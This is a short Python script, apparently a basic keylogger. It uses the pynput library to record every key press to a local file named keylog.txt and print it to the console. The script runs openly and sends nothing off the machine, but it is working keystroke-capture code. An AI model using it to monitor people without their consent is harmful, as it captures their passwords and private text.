import pynput.keyboard

def on_press(key):
    try:
        # Write the pressed key to a log file
        with open("keylog.txt", "a") as f:
            f.write("{0} pressed\n".format(key.char))
            print("{0} pressed".format(key.char))
    except AttributeError:
        # Special keys (e.g., Ctrl, Shift) are handled here
        with open("keylog.txt", "a") as f:
            f.write("{0} pressed\n".format(key))
            print("{0} pressed".format(key))

def main():
    print("Keylogger started.")
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keylogger stopped.")

if __name__ == "__main__":
    main()
